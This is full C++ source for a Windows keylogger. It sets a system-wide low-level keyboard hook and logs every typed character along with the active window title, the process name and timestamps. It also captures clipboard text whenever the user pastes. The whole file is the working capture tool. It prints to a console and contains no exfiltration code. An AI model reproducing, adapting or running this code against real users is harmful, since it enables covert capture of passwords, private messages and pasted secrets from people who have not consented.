#define WIN32_LEAN_AND_MEAN

#define _UNICODE
#define UNICODE

#include <Windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")
#include <iostream>
#include <map>
#include <vector>
#include <thread>

namespace SysInfo
{
	HWND hwnd;
	HWND oldHwnd;
	DWORD processId;
	HKL keyboardLayout;
	HHOOK hHook;
	WCHAR key;
	BYTE keyStates[256];
	SYSTEMTIME lastLocalTime;
}

namespace Bitmasks
{
	static constinit UINT SHORT_MSB = 0x8000;
	static constinit UINT SHORT_LSB = 0x0001;
	static constinit BYTE BYTE_MSB = 0x80;
}

namespace Colors
{
	LPCWSTR Red = L"\x1B[31m";
	LPCWSTR Green = L"\x1B[32m";
	LPCWSTR Yellow = L"\x1B[33m";
	LPCWSTR Blue = L"\x1B[34m";
	LPCWSTR Reset = L"\x1B[0m";
}

const std::map<DWORD, WCHAR> whitespaceKeys {
	{ VK_RETURN, L'\n' },
	{ VK_TAB, L'\t' },
	{ VK_BACK, L'\b' }
};

UINT textFormats[] = { CF_UNICODETEXT, CF_TEXT };

LPCWSTR GetExecutable()
{
	LPCWSTR executableName = L"";

	if (!SysInfo::processId)
		return executableName;

	HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, SysInfo::processId);
	if (!hProc)
		return executableName;

	LPWSTR executablePath = new WCHAR[MAX_PATH];
	DWORD executablePathSize = MAX_PATH;

	if (QueryFullProcessImageName(hProc, 0, executablePath, &executablePathSize))
		executableName = PathFindFileName(executablePath);
	
	CloseHandle(hProc);

	return executableName;
}

LPCWSTR GetAppTitle()
{
	LPCWSTR appTitle = new WCHAR[MAX_PATH];
	GetWindowText(SysInfo::hwnd, const_cast<LPWSTR>(appTitle), MAX_PATH);

	if (std::wstring(appTitle).substr(0, 2) == L"C:")
		appTitle = PathFindFileName(appTitle);

	return appTitle;
}

VOID PrintAppInfo()
{
	if (SysInfo::oldHwnd)
		std::cout << "\n\n" << std::flush;

	GetWindowThreadProcessId(SysInfo::hwnd, &SysInfo::processId);

	LPCWSTR appTitle = GetAppTitle();
	std::wcout << Colors::Yellow << appTitle << Colors::Reset << L' ' << std::flush;

	LPCWSTR executable = GetExecutable();
	std::wcout << Colors::Red << L'(' << executable << L')' << Colors::Reset << L" - " << std::flush;
}

VOID PrintTime()
{
	SYSTEMTIME lt;
	GetLocalTime(&lt);

	std::wcout << Colors::Blue << std::flush;

	if (!SysInfo::oldHwnd || SysInfo::lastLocalTime.wDay != lt.wDay)
		std::cout << lt.wDay << '/' << lt.wMonth << '/' << lt.wYear << ' ' << std::flush;
	
	std::cout << lt.wHour << ':' << lt.wMinute << '.' << lt.wSecond << std::flush;
	std::wcout << Colors::Reset << std::flush;

	SysInfo::lastLocalTime = lt;
}

BOOL PasteClipboardText()
{
	if (!OpenClipboard(NULL)) return FALSE;
	HANDLE hClipboardData = NULL;
	UINT format;

	for (UINT textFormat : textFormats)
	{
		if (!IsClipboardFormatAvailable(textFormat)) continue;

		hClipboardData = GetClipboardData(textFormat);
		format = textFormat;
		break;
	}
	if (hClipboardData)
	{
		LPVOID pStr = GlobalLock(hClipboardData);
		if (format == CF_UNICODETEXT)
		{
			LPWSTR pszWStr = static_cast<WCHAR*>(pStr);
			std::wcout << Colors::Green << pszWStr << Colors::Reset << std::flush;
		}
		else if (format == CF_TEXT)
		{
			LPSTR pszStr = static_cast<CHAR*>(pStr);
			std::wcout << Colors::Green << pszStr << Colors::Reset << std::flush;
		}

		GlobalUnlock(hClipboardData);
	}

	CloseClipboard();

	return hClipboardData ? TRUE : FALSE;
}

LRESULT CALLBACK LogKeystrokes(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		PKBDLLHOOKSTRUCT pKeyStruct = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
		DWORD vkCode = pKeyStruct->vkCode;
		UINT scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_CHAR, SysInfo::keyboardLayout);
		
		BOOL shiftPressed = GetAsyncKeyState(VK_SHIFT) & Bitmasks::SHORT_MSB;
		BOOL capsLockOn = GetAsyncKeyState(VK_CAPITAL) & Bitmasks::SHORT_LSB;
		BOOL ctrlPressed = GetAsyncKeyState(VK_CONTROL) & Bitmasks::SHORT_MSB;
		
		INT translation = 0;
		if (GetKeyboardState(SysInfo::keyStates) && !ctrlPressed)
		{
			if (shiftPressed)
				SysInfo::keyStates[VK_SHIFT] = Bitmasks::BYTE_MSB;

			translation = ToUnicodeEx((UINT)vkCode, scanCode, SysInfo::keyStates, 
									&SysInfo::key, 1, 0, SysInfo::keyboardLayout);
		}
		if (translation <= 0)
			SysInfo::key = static_cast<WCHAR>(vkCode);

		BOOL lowercase = (!shiftPressed && !capsLockOn) || (shiftPressed && capsLockOn);
		if (std::isalpha(SysInfo::key) && lowercase)
			SysInfo::key = tolower(SysInfo::key);

		BOOL whitespace = whitespaceKeys.find(vkCode) != whitespaceKeys.end();
		if (whitespace)
			SysInfo::key = whitespaceKeys.at(vkCode);

		if (isprint(SysInfo::key) || whitespace)
		{
			SysInfo::hwnd = GetForegroundWindow();
			if (SysInfo::hwnd != SysInfo::oldHwnd)
			{
				PrintAppInfo();
				PrintTime();
				std::cout << '\n' << std::flush;
			}

			if (!(ctrlPressed && (vkCode == 0x56) && PasteClipboardText()))
				std::wcout << SysInfo::key << std::flush;

			if (SysInfo::key == VK_BACK)
				std::cout << ' ' << '\b' << std::flush;

			SysInfo::oldHwnd = SysInfo::hwnd;
		}
	}

	return CallNextHookEx(SysInfo::hHook, nCode, wParam, lParam);
}

VOID HookKeystrokes()
{
	SysInfo::hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LogKeystrokes, GetModuleHandle(NULL), 0);
	if (!SysInfo::hHook)
		return;

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(SysInfo::hHook);
}

int main()
{
	SysInfo::hwnd = GetForegroundWindow();
	if (SysInfo::hwnd == NULL)
		return 1;
	
	GetWindowThreadProcessId(SysInfo::hwnd, &SysInfo::processId);

	SysInfo::keyboardLayout = GetKeyboardLayout(SysInfo::processId);

	std::thread hookThread(HookKeystrokes);
	hookThread.join();

	return 0;
}